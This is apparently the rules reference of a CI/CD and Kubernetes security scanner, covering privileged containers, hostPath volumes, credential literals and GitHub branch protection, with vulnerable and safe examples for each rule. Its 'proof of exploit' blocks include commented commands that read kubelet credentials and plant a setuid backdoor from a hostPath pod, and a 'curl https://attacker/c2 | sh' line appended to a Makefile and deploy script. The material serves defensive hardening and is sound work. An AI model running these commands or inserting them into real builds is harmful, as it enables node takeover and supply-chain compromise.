### `K8S-005`: Container securityContext.privileged: true <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-005 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** ``privileged: true`` is the strongest possible escalation in Kubernetes. It overrides every other securityContext setting and is the single largest cluster-takeover vector after RBAC misconfiguration.

**Recommendation.** Remove ``securityContext.privileged: true`` from every container. A privileged container has full access to the host's devices and capabilities, escape to the node is trivial. If the workload genuinely needs a kernel capability, grant only that capability via ``capabilities.add`` rather than enabling privileged mode.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``privileged: true`` gives the container the
# equivalent of root on the node — full ``/dev`` access,
# every Linux capability, and the ability to bypass
# namespace isolation. A workload compromise (poisoned
# image, RCE in app code, malicious chart) becomes a
# node-level shell, and from there pivots to every other
# pod on the node via the kubelet's credentials.
apiVersion: apps/v1
kind: Deployment
metadata: { name: app }
spec:
  template:
    spec:
      containers:
        - name: app
          image: app:1.2.3
          securityContext:
            privileged: true

# Safe: drop all caps; if the app genuinely needs ONE
# capability (e.g. ``NET_BIND_SERVICE`` to listen on port
# 80), add it back explicitly. ``runAsNonRoot`` +
# ``readOnlyRootFilesystem`` close the remaining escape
# routes that ``privileged: false`` alone doesn't.
apiVersion: apps/v1
kind: Deployment
metadata: { name: app }
spec:
  template:
    spec:
      containers:
        - name: app
          image: app@sha256:abc123...
          securityContext:
            privileged: false
            allowPrivilegeEscalation: false
            runAsNonRoot: true
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
```

**Source:** [`K8S-005`](../providers/kubernetes.md#k8s-005) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-013`: Pod uses a hostPath volume <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-013 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Some legitimate system DaemonSets need hostPath (log collectors, CSI node plugins). Those should be deployed with explicit security review and a narrow ``path:``; this rule fires regardless because *application* workloads should never use hostPath.

**Recommendation.** Replace ``hostPath`` volumes with ``configMap``, ``secret``, ``emptyDir``, ``persistentVolumeClaim``, or CSI volumes. ``hostPath`` opens a direct read/write window onto the node's filesystem; combined with even mild container compromise it gives the attacker access to other pods' data, kubelet credentials, and the container runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2021-25741](https://www.cve.org/CVERecord?id=CVE-2021-25741) (Kubernetes subPath volume traversal): a container could craft a ``subPath`` on a volume mount to access files outside the volume boundary. The bug affected multiple volume kinds; ``hostPath`` makes the blast radius worse because the volume already references host paths, so escaping the subpath lands directly on the node filesystem with the kubelet's privileges in scope.
- TeamTNT / Kinsing crypto-jacking campaigns (2020-2022): cluster compromise reports repeatedly traced lateral movement from a single misconfigured pod to the underlying node via hostPath:/, then to kubelet credentials and other tenants. Sysdig and Aqua incident reports document the pattern.

**Proof of exploit.**

```
# Vulnerable: pod mounts the host's root filesystem.
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /            # full node filesystem

# Attack from a shell inside the container:
#
#   # Read kubelet credentials and pivot to API server:
#   cat /host/var/lib/kubelet/kubeconfig
#   cat /host/etc/kubernetes/admin.conf
#
#   # Read service account tokens for every other pod on
#   # the node and impersonate them:
#   ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token
#
#   # Drop a setuid binary and pin persistence on the host:
#   cp /bin/busybox /host/usr/local/bin/.bd
#   chmod 4755 /host/usr/local/bin/.bd

# Safe: use scoped volume types that don't bridge to the host.
spec:
  volumes:
    - name: data
      persistentVolumeClaim:
        claimName: app-data
```

**Source:** [`K8S-013`](../providers/kubernetes.md#k8s-013) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-017`: Container env value carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-017 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS access keys outright, plus credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal. ``valueFrom`` entries are always safe (no inline value).

**Recommendation.** Replace literal ``env[].value`` entries that hold credentials with ``env[].valueFrom.secretKeyRef`` or ``envFrom.secretRef``. A literal env value lives in the manifest YAML. It gets committed to git, surfaced by ``kubectl get pod -o yaml``, and embedded in audit logs. Externalising into a Secret (and ideally a SealedSecret / ExternalSecret / SOPS-encrypted source) keeps the value out of the manifest.

**Proof of exploit.**

```
# Vulnerable: a literal credential value in a container
# ``env`` block. The Pod manifest is in etcd; anyone
# with ``pods/get`` on the namespace reads the value.
# Logs that echo the env (``env``, ``printenv``,
# ``env | curl ...``) further leak it.
apiVersion: v1
kind: Pod
metadata: { name: app }
spec:
  containers:
    - name: app
      image: app@sha256:abc123...
      env:
        - name: AWS_ACCESS_KEY_ID
          value: AKIAIOSFODNN7EXAMPLE
        - name: AWS_SECRET_ACCESS_KEY
          value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Safe: reference a Kubernetes Secret via
# ``valueFrom.secretKeyRef``. The Pod manifest carries
# the Secret's name only; the value resolves at
# kubelet-runtime from the cluster's Secret store.
apiVersion: v1
kind: Pod
metadata: { name: app }
spec:
  containers:
    - name: app
      image: app@sha256:abc123...
      env:
        - name: AWS_ACCESS_KEY_ID
          valueFrom:
            secretKeyRef: { name: aws-app, key: access_key_id }
        - name: AWS_SECRET_ACCESS_KEY
          valueFrom:
            secretKeyRef: { name: aws-app, key: secret_access_key }
```

**Source:** [`K8S-017`](../providers/kubernetes.md#k8s-017) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-018`: Secret stringData/data carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-018 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Walks both ``stringData`` (plain text) and ``data`` (base64). Base64-encoded values are decoded and checked for AKIA-shaped AWS keys. Credential-shaped key NAMES with any non-empty value are flagged regardless of encoding, even if the value is the literal placeholder ``REPLACE_ME``, having the name in the manifest is a maintenance footgun.

**Recommendation.** A ``Kind: Secret`` manifest committed to git defeats every secret-management story Kubernetes claims to provide, the base64 encoding in ``data`` is *not* encryption. Replace with SealedSecrets (Bitnami), ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection. If the manifest must remain in git, the only acceptable contents are placeholders that are filled in by an operator at apply time.

**Proof of exploit.**

```
# Vulnerable: a Kubernetes Secret with credential-shaped
# literals in ``stringData`` (or base64'd in ``data``).
# The Secret object is in etcd; ``kubectl get secret
# -o yaml`` exposes the value to anyone with
# ``secrets/get`` on the namespace. Worse, committing
# this Secret YAML to git leaks the credential to
# every repo reader plus history forever.
apiVersion: v1
kind: Secret
metadata: { name: aws-app, namespace: prod }
stringData:
  access_key_id: AKIAIOSFODNN7EXAMPLE
  secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Safe: source the Secret from an external secrets
# manager via External Secrets Operator (ESO) — the
# YAML committed to git references the value by name
# only; the actual material lives in AWS Secrets
# Manager / Vault / GSM and rotates there.
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata: { name: aws-app, namespace: prod }
spec:
  refreshInterval: 1h
  secretStoreRef: { name: vault-backend, kind: ClusterSecretStore }
  target: { name: aws-app, creationPolicy: Owner }
  data:
    - secretKey: access_key_id
      remoteRef: { key: prod/aws-app, property: access_key_id }
    - secretKey: secret_access_key
      remoteRef: { key: prod/aws-app, property: secret_access_key }
```

**Source:** [`K8S-018`](../providers/kubernetes.md#k8s-018) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-037`: ConfigMap data carries a credential-shaped literal <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-037 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Companion to K8S-018 (which scans Kind: Secret). Walks ConfigMap ``data`` and ``binaryData`` for AKIA-shaped AWS keys and credential-shaped key NAMES. Even when the value is a placeholder, having ``api_key: REPLACE_ME`` in a ConfigMap is a maintenance footgun, someone will fill it in and commit. RBAC scoping for ``configmaps`` is typically much broader than ``secrets``, so any credential leak via this path reaches a wider audience.

**Recommendation.** Move the value out of the ConfigMap. Secrets belong in ``Kind: Secret`` (better: SealedSecrets, ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection). ConfigMaps are intended for non-sensitive config and are mounted into pods without the access controls Secrets carry, the ``RoleBinding`` for ``configmaps:get`` is typically far broader than the one for ``secrets:get``. A credential in a ConfigMap is effectively unprotected once any pod can read the namespace's config.

**Known false positives.**

- ConfigMaps that legitimately carry placeholder names (``DEBUG_TOKEN_FORMAT``, ``LICENSE_KEY_HEADER``) where the VALUE is a format hint rather than a credential. Rename the key to avoid the credential-shaped name.

**Proof of exploit.**

```
# Vulnerable: a ConfigMap with a credential-shaped
# value. ConfigMaps are NOT encrypted at rest in etcd
# (Secrets are, when encryption-at-rest is configured);
# anyone with ``configmaps/get`` reads the value.
# ``kubectl get configmap -o yaml`` exposes it; the
# YAML committed to git leaks it to every repo reader.
apiVersion: v1
kind: ConfigMap
metadata: { name: app-config, namespace: prod }
data:
  database_url: postgres://app:hunter2-prod-pw@db.example.com/app
  api_token: sk_live_abc123def456ghi789

# Safe: store credentials in a Secret (encrypted at
# rest if encryption-at-rest is enabled). Reference
# the Secret from the Pod's env via
# ``valueFrom.secretKeyRef``. The ConfigMap carries
# only non-secret configuration (feature flags, log
# levels, etc.).
apiVersion: v1
kind: ConfigMap
metadata: { name: app-config, namespace: prod }
data:
  log_level: info
  feature_flag_x: "true"
---
apiVersion: v1
kind: Secret
metadata: { name: app-creds, namespace: prod }
type: Opaque
stringData:
  database_url: postgres://app:hunter2-prod-pw@db.example.com/app
  api_token: sk_live_abc123def456ghi789
```

**Source:** [`K8S-037`](../providers/kubernetes.md#k8s-037) in the [Kubernetes provider](../providers/kubernetes.md).

### `SCM-001`: Default branch has no protection rule <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-001 }

**Evidences:** [`1.1.15`](#ctrl-1-1-15) Ensure pushing/merging on default branches is restricted.

**How this is detected.** Without a branch protection rule on the default branch, anyone with write access can force-push, delete the branch, or merge directly without review. Even when CI runs on the branch, an unprotected default branch lets a single compromised maintainer rewrite history and erase the audit trail. The check is sourced from the GitHub REST API (``GET /repos/{owner}/{repo}/branches/{branch}/protection``); a 404 response is itself the failure signal.

**Recommendation.** Add a branch protection rule on the default branch in the repository's Settings -> Branches. At minimum require pull request reviews before merging, require status checks to pass, and disable force-pushes / deletions. Match the rule to OpenSSF Scorecard's Branch-Protection thresholds for the organization's compliance baseline.

**Seen in the wild.**

- Numerous post-incident reports (PyPI / RubyGems package compromises 2018-2024) trace the initial maintainer-account takeover step to the absence of branch protection: the attacker pushed a single tampered commit to the default branch, the release pipeline ran on push, the malicious build shipped to the registry within minutes, and recovery required force-pushing the audit trail itself. Branch protection turns the entire class of attack into a review-then-merge gate.

**Proof of exploit.**

```
# With no protection rule on ``main``, a single compromised
# maintainer credential is enough to ship a tampered build:
#
#   git checkout main
#   echo 'curl https://attacker/c2 | sh' >> Makefile
#   git commit -am 'fix: tweak'
#   git push origin main           # no review required
#   # CI now runs the tampered build with full secret access.
#
# Recovery needs force-push to rewrite the trail:
#   git push --force origin main   # also unprotected
#
# A protection rule with `required_pull_request_reviews` set
# and `allow_force_pushes: false` blocks both the push and
# the rewrite without giving up an inch of velocity.
```

**Source:** [`SCM-001`](../providers/scm.md#scm-001) in the [SCM provider](../providers/scm.md).

### `SCM-002`: Default branch protection does not require pull request reviews <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-002 }

**Evidences:** [`1.1.3`](#ctrl-1-1-3) Ensure any change to code is approved by two strongly authenticated users.

**How this is detected.** Reads ``required_pull_request_reviews.required_approving_review_count`` from the branch protection payload. Fires when the field is absent (no review requirement at all) or when the count is 0. ``SCM-001`` covers the case where no protection rule exists; this rule scopes specifically to the review-count knob inside an existing rule.

**Recommendation.** In the default-branch protection rule, enable ``Require a pull request before merging`` and set the minimum approving review count to at least 1 (Scorecard's threshold for Branch-Protection's middle tier; raise to 2 for higher trust). Combine with ``Dismiss stale pull request approvals when new commits are pushed`` so a force-push doesn't carry an old approval forward.

**Known false positives.**

- ``required_pull_request_reviews.bypass_pull_request_allowances`` is covered by ``SCM-018``: a protection rule that requires reviews but lists every contributor in the bypass allowlist still passes this rule even though the control is unenforced in practice. Read SCM-002 + SCM-018 as a pair when auditing whether required review actually fires.

**Proof of exploit.**

```
# With protection but no required reviews, a maintainer can
# self-approve a tampered change in two clicks:
#
#   git checkout -b release-fix
#   echo 'curl https://attacker/c2 | sh' >> deploy.sh
#   git commit -am 'fix: handle edge case'
#   git push origin release-fix
#   gh pr create --fill
#   gh pr merge --squash --auto    # no second-set-of-eyes
#   # Release pipeline runs the tampered build with full
#   # production secrets in scope.
#
# Setting ``required_approving_review_count`` to >= 1 forces
# a separate identity to acknowledge the change before merge.
```

**Source:** [`SCM-002`](../providers/scm.md#scm-002) in the [SCM provider](../providers/scm.md).

### `SCM-003`: GitHub default code scanning is not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-003 }

**Evidences:** [`1.1.18`](#ctrl-1-1-18) Ensure any merging of code is automatically scanned for security, [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Reads ``state`` from the default code-scanning setup endpoint (``GET /repos/{owner}/{repo}/code-scanning/default-setup``). Fires when ``state`` is anything other than ``configured`` (``not-configured``, missing, or 404). This check only evaluates the default-setup endpoint. Repos running hand-authored CodeQL workflows or third-party SARIF uploads can still fail SCM-003; suppress per repo via ignore-file when that alternative coverage is intentional.

**Recommendation.** Enable default code scanning under the repository's Settings -> Code security -> Code scanning -> Default. The GitHub-managed CodeQL setup picks the right languages automatically and writes findings into the Code Scanning UI on every push and PR. Teams that already ship a CodeQL workflow can leave this rule's check off — but the default setup is the lowest-friction path for repos that don't have one.

**Known false positives.**

- Repos that ship a hand-authored CodeQL workflow (or use Semgrep / Snyk / another SAST whose results land in the Code Scanning UI via SARIF upload) get the same coverage without enabling default setup. Suppress via ignore-file rather than removing the rule.

**Proof of exploit.**

```
# Without code scanning, the only signal that a PR
# introduces (e.g.) a SQL injection or hardcoded secret
# comes from the human reviewer:
#
#   - def lookup(user_id):
#   -     return db.query("SELECT * FROM u WHERE id = ?", user_id)
#   + def lookup(user_id):
#   +     return db.query(f"SELECT * FROM u WHERE id = {user_id}")
#
# A reviewer skimming a 400-line PR misses this. Default
# CodeQL setup catches the same change as a CWE-89 finding
# in the PR check, surfaces it inline in the diff, and
# blocks the merge if the protection rule wires it up as
# a required status check (see SCM-008).
```

**Source:** [`SCM-003`](../providers/scm.md#scm-003) in the [SCM provider](../providers/scm.md).

### `SCM-004`: GitHub secret scanning is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-004 }

**Evidences:** [`1.1.20`](#ctrl-1-1-20) Ensure any merging of code is automatically scanned for secrets, [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code.

**How this is detected.** Reads ``security_and_analysis.secret_scanning.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Public repos get secret scanning free since 2023; private repos require a GitHub Advanced Security license. Without secret scanning, a credential committed even briefly is recoverable from git history indefinitely.

**Recommendation.** Enable secret scanning under the repository's Settings -> Code security -> Secret scanning. The GitHub-managed scanner covers ~200 token patterns from major providers and runs on every push. Pair with push protection so secrets are blocked at commit time rather than caught after the fact.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. The fix is to grant the token admin scope on the repo (or re-run with a personal token from a maintainer) rather than to suppress the rule.

**Seen in the wild.**

- GitGuardian's annual State of Secrets Sprawl reports find millions of fresh credential leaks per year across public GitHub commits, with the median time-to-revocation measured in days. Native secret scanning alerts the maintainer within minutes of the push, collapsing the exploitable window from days to minutes for the patterns it covers.

**Proof of exploit.**

```
# Vulnerable: a developer pushes a commit that contains a
# leaked AWS access key in source code. Without secret
# scanning enabled, GitHub never surfaces an alert; the
# secret stays in the repo's git history forever and any
# repo reader (or future fork) extracts it. Public repos
# are crawled by attackers continuously for AKIA-prefixed
# strings.
# GET /repos/myorg/myrepo (vulnerable response):
{
  "security_and_analysis": {
    "secret_scanning": {"status": "disabled"}
  }
}

# Safe: enable secret scanning. GitHub then scans every
# push and historical commit for known credential
# patterns and surfaces alerts; pair with push protection
# (SCM-015) so secrets are blocked at push time before
# they land in history.
# PATCH /repos/myorg/myrepo:
{
  "security_and_analysis": {
    "secret_scanning": {"status": "enabled"}
  }
}
```

**Source:** [`SCM-004`](../providers/scm.md#scm-004) in the [SCM provider](../providers/scm.md).

### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }

**Evidences:** [`1.1.19`](#ctrl-1-1-19) Ensure any merging of code is automatically scanned for vulnerabilities, [`1.2.6`](#ctrl-1-2-6) Ensure all code projects are tracked for changes in dependents/dependencies, [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Reads ``security_and_analysis.dependabot_security_updates.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Without security updates, the team has to discover and triage CVEs against their dependency graph manually — a delay measured in days or weeks even on attentive teams, vs hours when the bot opens the PR for them.

**Recommendation.** Enable Dependabot security updates under the repository's Settings -> Code security -> Dependabot. The bot opens a PR with the minimum-required upgrade for each open advisory against an in-use dependency. Pair with version-update config (``.github/dependabot.yml``) so routine bumps don't rely on the security-update path.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that delegate dependency-update PRs to Renovate, Snyk, or another bot get equivalent coverage without Dependabot. Suppress via ignore-file rather than removing the rule.

**Source:** [`SCM-005`](../providers/scm.md#scm-005) in the [SCM provider](../providers/scm.md).

### `SCM-006`: Default branch protection does not require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-006 }

**Evidences:** [`1.1.12`](#ctrl-1-1-12) Ensure verification of signed commits for new changes.

**How this is detected.** Reads ``required_signatures.enabled`` from the branch protection payload. Fires when the field is missing or False. Required signatures don't validate signature authenticity (the GitHub web UI does that lazily on render), but a missing signature is rejected at push time, which blocks the most common compromise pattern: a stolen personal access token used to push under the maintainer's name without their signing key.

**Recommendation.** In the default-branch protection rule, enable ``Require signed commits``. Configure GPG, SSH, or S/MIME signatures for every contributor's git client (``git config commit.gpgsign true`` plus an uploaded public key). Pair with branch protection's ``Restrict who can push to matching branches`` so only signed commits from authorized identities land on the default branch.

**Source:** [`SCM-006`](../providers/scm.md#scm-006) in the [SCM provider](../providers/scm.md).

### `SCM-007`: Default branch protection allows force-pushes <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-007 }

**Evidences:** [`1.1.16`](#ctrl-1-1-16) Ensure force push is denied.

**How this is detected.** Reads ``allow_force_pushes.enabled`` from the branch protection payload. Fires when the value is True. The complementary deletion-protection knob is covered by ``SCM-009``; this rule focuses on the rewrite-history attack class because force-push is the primitive every post-incident rewrite uses to clean up after itself.

**Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.

**Proof of exploit.**

```
# Vulnerable: ``allow_force_pushes: true`` on the
# default branch's protection. A maintainer (or anyone
# with write access via a compromised token) can rewrite
# history on ``main``, erasing the audit trail of which
# commits shipped which behavior. Used to hide malicious
# commits after the fact.
# GET /repos/myorg/myrepo/branches/main/protection:
{
  "allow_force_pushes": {"enabled": true},
  "allow_deletions": {"enabled": false}
}

# Safe: force pushes off. History on ``main`` is now
# append-only; rebasing or amending requires a PR with
# the explicit history change.
# PUT /repos/myorg/myrepo/branches/main/protection:
{
  "allow_force_pushes": {"enabled": false},
  "allow_deletions": {"enabled": false}
}
```

**Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).

### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }

**Evidences:** [`1.1.9`](#ctrl-1-1-9) Ensure all checks have passed before merging new code, [`1.1.10`](#ctrl-1-1-10) Ensure open Git branches are up to date before they can be merged.

**How this is detected.** Reads ``required_status_checks.contexts`` (or the newer ``checks`` shape) from the branch protection payload. Fires when the field is missing or the contexts list is empty. Without required checks the merge gate degrades to human-only review; SCM-002 covers the review knob, this rule covers the automated-verification knob, and both should be on for high-trust default branches.

**Recommendation.** In the default-branch protection rule, enable ``Require status checks to pass before merging`` and list every check the team relies on (CI build, code scanning, secret scanning, lint). Set ``strict: true`` (``Require branches to be up to date before merging``) so a stale base doesn't land regressions the latest checks would catch.

**Known false positives.**

- The ``restrictions`` block (users / teams / apps allowed to push directly to the protected branch) is not consulted today: a rule that requires status checks but lists every contributor in the push-restrictions allowlist still passes this rule even though those identities can land code without the checks running. Audit the allowlist in the GitHub UI when this rule passes on a high-trust repo.
- Status-check names are matched as opaque strings; a configured required check that no workflow actually emits (typo, deleted job) will still pass this rule. The check would block the merge in practice (GitHub waits for the named context forever), but the misconfiguration itself isn't visible from the protection payload.

**Source:** [`SCM-008`](../providers/scm.md#scm-008) in the [SCM provider](../providers/scm.md).

### `SCM-009`: Default branch protection allows branch deletion <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-009 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure branch deletion is denied.

**How this is detected.** Reads ``allow_deletions.enabled`` from the branch protection payload. Fires when the value is True. Pairs with SCM-007 (force-push allowed) — the two flags together cover the complete rewrite-history attack class.

**Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.

**Proof of exploit.**

```
# Vulnerable: ``allow_deletions: true`` lets anyone with
# write access delete the default branch entirely. A
# compromised token (leaked PAT, malicious workflow
# running with ``contents: write``) erases the branch
# along with the production deployment trail.
# GET /repos/myorg/myrepo/branches/main/protection:
{
  "allow_deletions": {"enabled": true}
}

# Safe: branch deletion off. ``main`` cannot be deleted
# via API or UI without first removing the protection
# rule, which itself is an audited admin action.
# PUT /repos/myorg/myrepo/branches/main/protection:
{
  "allow_deletions": {"enabled": false}
}
```

**Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).

### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }

**Evidences:** [`1.1.14`](#ctrl-1-1-14) Ensure branch protection rules are enforced for administrators.

**How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.

**Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.

**Proof of exploit.**

```
# Vulnerable: ``enforce_admins: false`` (or its absence)
# lets repo admins push directly to ``main``, skip
# required reviews, and bypass status checks. An admin's
# token leak escalates straight to ``main``-write.
# GET /repos/myorg/myrepo/branches/main/protection:
{
  "required_pull_request_reviews": {
    "required_approving_review_count": 2
  },
  "enforce_admins": {"enabled": false}
}

# Safe: ``enforce_admins: true`` so the protection
# applies to admins too. Reviews and status checks are
# no longer bypassable.
# PUT /repos/myorg/myrepo/branches/main/protection:
{
  "required_pull_request_reviews": {
    "required_approving_review_count": 2
  },
  "enforce_admins": {"enabled": true}
}
```

**Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).

### `SCM-011`: Default branch protection does not require CODEOWNERS reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-011 }

**Evidences:** [`1.1.3`](#ctrl-1-1-3) Ensure any change to code is approved by two strongly authenticated users, [`1.1.6`](#ctrl-1-1-6) Ensure code owners are set for extra sensitive code or configuration, [`1.1.7`](#ctrl-1-1-7) Ensure code owner's review is required when a change affects owned code.

**How this is detected.** Reads ``required_pull_request_reviews.require_code_owner_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` covers the bare review-count knob; this rule scopes specifically to whose review counts. The check evaluates only the protection-rule toggle; verifying that an actual ``CODEOWNERS`` file exists at ``.github/CODEOWNERS`` (and covers the right paths) is left to the recommendation, since the GitHub API surfaces the file's presence as a separate contents request the SCM provider does not fetch.

**Recommendation.** In the default-branch protection rule, enable ``Require review from Code Owners``. Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (or ``docs/CODEOWNERS``) mapping directories to the team or individual responsible. The GitHub UI auto-requests review from the matched owners on every PR that touches a covered path; combined with this branch-protection knob, the merge is blocked until they approve.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path don't need the routing CODEOWNERS provides — but the protection knob still helps when a new team member joins. Suppress via ignore-file when the team intentionally stays flat.

**Source:** [`SCM-011`](../providers/scm.md#scm-011) in the [SCM provider](../providers/scm.md).

### `SCM-012`: Default branch protection keeps stale reviews after a push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-012 }

**Evidences:** [`1.1.4`](#ctrl-1-1-4) Ensure previous approvals are dismissed when updates are introduced.

**How this is detected.** Reads ``required_pull_request_reviews.dismiss_stale_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` ensures a review is required at all; this rule ensures the approval the team relies on actually corresponds to the diff being merged.

**Recommendation.** In the default-branch protection rule, enable ``Dismiss stale pull request approvals when new commits are pushed``. Approvals will be cleared every time the PR head moves; the reviewer has to re-approve the latest diff before merge, closing the time-of-check / time-of-use gap an attacker can exploit by amending the branch after approval.

**Source:** [`SCM-012`](../providers/scm.md#scm-012) in the [SCM provider](../providers/scm.md).

### `SCM-013`: Default branch protection does not require conversation resolution <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-013 }

**Evidences:** [`1.1.11`](#ctrl-1-1-11) Ensure all open comments are resolved before merging code.

**How this is detected.** Reads ``required_conversation_resolution.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Severity is LOW because the rule documents process discipline rather than a structural vulnerability — but unresolved security comments are a common upstream cause of incidents.

**Recommendation.** In the default-branch protection rule, enable ``Require conversation resolution before merging``. PRs cannot land until every review comment is marked resolved. The friction is small (the PR author clicks ``Resolve`` after addressing) and the payoff is concrete: review comments can't be ignored to ship faster.

**Source:** [`SCM-013`](../providers/scm.md#scm-013) in the [SCM provider](../providers/scm.md).

### `SCM-014`: Default branch protection does not require approval of the most recent push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-014 }

**Evidences:** [`1.1.3`](#ctrl-1-1-3) Ensure any change to code is approved by two strongly authenticated users, [`1.1.4`](#ctrl-1-1-4) Ensure previous approvals are dismissed when updates are introduced.

**How this is detected.** Reads ``required_pull_request_reviews.require_last_push_approval`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with SCM-012 (dismiss stale reviews) — both close the same approval-time-of-check / merge-time-of-use gap from different angles.

**Recommendation.** In the default-branch protection rule, enable ``Require approval of the most recent reviewable push``. The reviewer and the most recent pusher must be different identities; an attacker controlling one collaborator account can no longer ship a malicious diff under another collaborator's approval.

**Source:** [`SCM-014`](../providers/scm.md#scm-014) in the [SCM provider](../providers/scm.md).

### `SCM-015`: Secret scanning push protection is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-015 }

**Evidences:** [`1.1.20`](#ctrl-1-1-20) Ensure any merging of code is automatically scanned for secrets, [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code.

**How this is detected.** Reads ``security_and_analysis.secret_scanning_push_protection.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Strongly paired with SCM-004 (secret scanning enabled): SCM-004 catches credentials after the push, SCM-015 stops them at the push. Both should be on for high-trust repos.

